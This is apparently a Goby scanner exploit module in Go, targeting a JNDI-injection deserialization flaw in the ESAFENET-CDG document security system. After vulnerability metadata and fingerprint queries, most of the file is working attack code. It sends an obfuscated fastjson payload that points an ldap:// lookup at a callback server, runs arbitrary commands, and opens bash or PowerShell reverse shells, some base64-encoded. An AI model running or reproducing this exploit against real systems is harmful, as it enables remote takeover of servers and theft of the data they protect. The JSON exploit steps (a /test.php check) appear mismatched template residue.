package exploits

import (
	"encoding/base64"
	"errors"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
	"time"
	"unicode/utf16"
)

func init() {
	expJson := `{
    "Name": "ESAFENET-CDG /CDGServer3/sync/user Command Execution Vulnerability",
    "Description": "<p>ESAFENET-CDG is an electronic document security management system that uses transparent encryption technology at the driver layer to protect electronic documents, preventing internal employees from leaking and external personnel from illegally stealing the company's core important data assets. It provides full lifecycle protection for electronic documents and supports various encryption methods such as transparent encryption, proactive encryption, and intelligent encryption. Users can deploy different levels of document encryption protection based on the confidentiality level of departments (e.g., core departments and ordinary departments), achieving an organic combination of technology, management, and auditing. This builds a three-dimensional overall information leakage prevention system internally, balancing cost, efficiency, and security to ensure the data security of electronic documents. A deserialization vulnerability exists in the /CDGServer3/sync/user interface, allowing attackers to execute JNDI injection, leading to remote command execution.</p>",
    "Product": "ESAFENET-CDG",
    "Homepage": "http://www.esafenet.com/product/277483397",
    "DisclosureDate": "2024-06-12",
    "PostTime": "2025-01-08",
    "Author": "heqiming@baimaohui.net",
    "FofaQuery": "body=\"CDGServer3\" ||( title=\"电子文档安全管理系统\" && body=\"电子文档安全管理系统\") || cert=\"esafenet\" || body=\"/help/getEditionInfo.jsp\"",
    "GobyQuery": "body=\"CDGServer3\" ||( title=\"电子文档安全管理系统\" && body=\"电子文档安全管理系统\") || cert=\"esafenet\" || body=\"/help/getEditionInfo.jsp\"",
    "Level": "2",
    "Impact": "<p>Attackers can exploit this vulnerability to execute arbitrary code on the server, implant backdoors, gain server permissions, and ultimately control the entire web server.</p>",
    "Recommendation": "<p>The vendor has released a patch for this vulnerability. Please contact the vendor to update: <a href=\"https://www.esafenet.com/\">https://www.esafenet.com/</a></p>",
    "References": [
        "https://github.com/ax1sX/SecurityList/blob/5a99da1aa91685827c1e72429fff9dc63ce7967c/Java_OA/CDGServer3_old.md?plain=1#L160"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "reverse",
            "type": "select",
            "value": "ByPowershellBase64,ByPowershell",
            "show": "attackType=reverse"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "username",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution",
        "2H1W"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "亿赛通电子文档安全系统 /CDGServer3/sync/user 命令执行漏洞",
            "Product": "亿赛通-电子文档安全管理系统",
            "Description": "<p>亿赛通电子文档安全管理系统（简称：CDG）是一款电子文档安全加密软件，该系统利用驱动层透明加密技术，通过对电子文档的加密保护，防止内部员工泄密和外部人员非法窃取企业核心重要数据资产，对电子文档进行全生命周期防护，系统具有透明加密、主动加密、智能加密等多种加密方式，用户可根据部门涉密程度的不同（如核心部门和普通部门），部署力度轻重不一的梯度式文档加密防护，实现技术、管理、审计进行有机的结合，在内部构建起立体化的整体信息防泄露体系，使得成本、效率和安全三者达到平衡，实现电子文档的数据安全。系统的 /CDGServer3/sync/user 接口存在反序列化漏洞，导致攻击者可以向接口执行JNDI注入，造成远程命令执行。</p>",
            "Recommendation": "<p>厂商已发布漏洞修复程序，请联系厂商更新：<a href=\"https://www.esafenet.com/\">https://www.esafenet.com/</a></p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。</p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "ESAFENET-CDG /CDGServer3/sync/user Command Execution Vulnerability",
            "Product": "ESAFENET-CDG",
            "Description": "<p>ESAFENET-CDG is an electronic document security management system that uses transparent encryption technology at the driver layer to protect electronic documents, preventing internal employees from leaking and external personnel from illegally stealing the company's core important data assets. It provides full lifecycle protection for electronic documents and supports various encryption methods such as transparent encryption, proactive encryption, and intelligent encryption. Users can deploy different levels of document encryption protection based on the confidentiality level of departments (e.g., core departments and ordinary departments), achieving an organic combination of technology, management, and auditing. This builds a three-dimensional overall information leakage prevention system internally, balancing cost, efficiency, and security to ensure the data security of electronic documents. A deserialization vulnerability exists in the /CDGServer3/sync/user interface, allowing attackers to execute JNDI injection, leading to remote command execution.</p>",
            "Recommendation": "<p>The vendor has released a patch for this vulnerability. Please contact the vendor to update: <a href=\"https://www.esafenet.com/\">https://www.esafenet.com/</a></p>",
            "Impact": "<p>Attackers can exploit this vulnerability to execute arbitrary code on the server, implant backdoors, gain server permissions, and ultimately control the entire web server.</p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "VariablesOrder": [],
    "EditType": "fast",
    "PocId": "9982"
}`

	setPayloadRequestHash0001dsadadasdasdwffsdfdsfdshtyjghdgergiuhfidsbgfuyewbfbsdfsfefsegrtgdgwtgdthtyjhgjuikkujgnhdfgfgsfdsFFds := func(hostInfo *httpclient.FixUrl, cmd string) (string, string, error) {
		loopholesRequestConfig := httpclient.NewPostRequestConfig("/CDGServer3/sync/user")
		loopholesRequestConfig.FollowRedirect = false
		loopholesRequestConfig.VerifyTls = false
		loopholesRequestConfig.Header.Store("Content-Type", "application/json")
		loopholesRequestConfig.Header.Store("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
		loopholesRequestConfig.Header.Store("cmd", cmd)
		loopholesRequestConfig.Data = `{
"a": {
"\x40\u0074\u0079\u0070\u0065":
"java.\u006C\u0061\u006E\u0067.\u0043\u006C\u0061\u0073\u0073",
"val":
"\u0063\u006F\u006D\u002E\u0073\u0075\u006E\u002E\u0072\u006F\u0077\u0073\u0065\u007
4\u002E\u004A\u0064\u0062\u0063\u0052\u006F\u0077\u0053\u0065\u0074\u0049\u006D\u007
0\u006C"
},
"b": {
"\x40\u0074\u0079\u0070\u0065":
"\u0063\u006F\u006D\u002E\u0073\u0075\u006E\u002E\u0072\u006F\u0077\u0073\u0065\u007
4\u002E\u004A\u0064\u0062\u0063\u0052\u006F\u0077\u0053\u0065\u0074\u0049\u006D\u007
0\u006C",
"dataSourceName":
"\u006C\u0064\u0061\u0070\u003A\u002F\u002F` + godclient.GetGodServerHost() + `/A4",
"autoCommit": true
}
}`
		resp, err := httpclient.DoHttpRequest(hostInfo, loopholesRequestConfig)
		if err != nil {
			return "", "", err
		}
		url := "/CDGServer3/sync/user"
		return resp.Utf8Html, url, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHash0001dsadadasdasdwffsdfdsfdshtyjghdgergiuhfidsbgfuyewbfbsdfsfefsegrtgdgwtgdthtyjhgjuikkujgnhdfgfgsfdsFFds

			text := goutils.RandomHexString(16)
			pocCommand := `echo ` + text
			pocRuselt, pocUrl, err := runPayload(hostInfo, pocCommand)
			if err != nil {
				return false
			}
			if strings.Contains(pocRuselt, text) {
				ss.VulURL = hostInfo.FixedHostInfo + pocUrl
				return true
			}
			return false

		},
		//exp利用函数
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHash0001dsadadasdasdwffsdfdsfdshtyjghdgergiuhfidsbgfuyewbfbsdfsfefsegrtgdgwtgdthtyjhgjuikkujgnhdfgfgsfdsFFds

			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBashBase64" {
							command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				Result, _, err := runPayload(expResult.HostInfo, command)
				Result = strings.Split(Result, "{\"m")[0]

				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}

				if len(Result) > 0 {
					expResult.Success = true
					expResult.Output = Result
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])

				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
